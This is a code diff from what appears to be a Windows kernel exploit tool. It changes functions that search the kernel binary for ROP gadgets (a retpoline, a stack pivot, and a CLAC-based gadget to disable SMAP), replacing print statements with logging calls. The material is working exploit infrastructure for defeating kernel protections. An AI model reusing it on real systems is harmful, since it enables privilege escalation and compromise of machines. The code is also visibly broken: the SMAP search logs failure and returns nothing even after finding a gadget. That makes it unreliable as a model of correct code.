@@ -262,6 +262,8 @@ private:
 		// and use match the resulting gadget with our gadget.
 		//
 
+		LOG_DEBUG( "Trying to locate SMAP gadget" );
+
 		constexpr Byte ClacJmpRel32[] = { 0x0F, 0x01, 0xCA, 0xE9 };
 		auto signature = Sig::FromBytes(std::span<const Byte>(ClacJmpRel32));
 		
@@ -271,12 +273,12 @@ private:
 		const Byte* smapGadget = nullptr;
 		g_KernelBinary->ForEveryCodeSignatureOccurrence(signature,
 			[&](const Byte* occurrence) -> bool {
-				std::cout << "[*] Consumer called, occurrence=" << std::hex << Qword(occurrence) << std::endl;
+				LOG_DEBUG("Consumer called, occurrence=0x%08llx", occurrence);
 
 				auto* rel32 = occurrence + sizeof(ClacJmpRel32);
 				auto* jmpTarget = occurrence + *(int*)rel32 + 5 +3;
 
-				std::cout << "[*] jmp target=" << std::hex << Qword(jmpTarget) << std::endl;
+				LOG_DEBUG( "Jmp target: 0x%08llx", jmpTarget );
 
 				// simple bounds check
 				if (!g_KernelBinary->InKernelBounds(jmpTarget)) return true;
@@ -288,6 +290,7 @@ private:
 
 				if (found) {
 					smapGadget = occurrence;
+					LOG_INFO( "Found SMAP gadget! 0x%08llx", smapGadget );
 					return false;
 				}
 
@@ -296,12 +299,14 @@ private:
 			});
 
 		if (smapGadget) g_KernelBinary->MappedToKernel(smapGadget);
+
+		LOG_WARN( "Failed to find SMAP gadget" );
 		return std::nullopt;
 	}
 
 	bool InitializeGadgets()
 	{
-		OutputDebugStringA("[*] Finding gadgets...\n");
+		LOG_DEBUG("Finding gadgets...");
 
 		const std::string RetpolineCode = "488b442420488b4c2428488b5424304c8b4424384c8b4c24404883c44848ffe0";
 		auto retpolineSignature = Sig::FromHex(RetpolineCode);
@@ -309,7 +314,7 @@ private:
 		if (!retpolineAddress) return false;
 		m_Gadgets.Retpoline = retpolineAddress.value();
 
-		OutputDebugStringA("\t[*] Successfully found retpoline\n");
+		LOG_DEBUG( "Found retpoline gadget at 0x%llx", retpolineAddress.value() );
 
 		const std::string StackPivotCode = "488be54883c4305f5e5dc3";
 		auto stackPivotSignature = Sig::FromHex(StackPivotCode);
@@ -317,13 +322,13 @@ private:
 		if (!stackPivotAddress) return false;
 		m_Gadgets.StackPivot = stackPivotAddress.value();
 	
-		OutputDebugStringA("\t[*] Successfully found stack pivot\n");
+		LOG_DEBUG( "Found stack pivot gadget at 0x%llx", stackPivotAddress.value() );
 
 		auto smapGadget = TryFindSmapGadget();
 		if (!smapGadget) return false;
 		m_Gadgets.DisableSmap = smapGadget.value();
 
-		OutputDebugStringA("[+] Successfully found all gadgets\n");
+		LOG_INFO( "Found all gadgets!" );
 
 		return true;
 	}
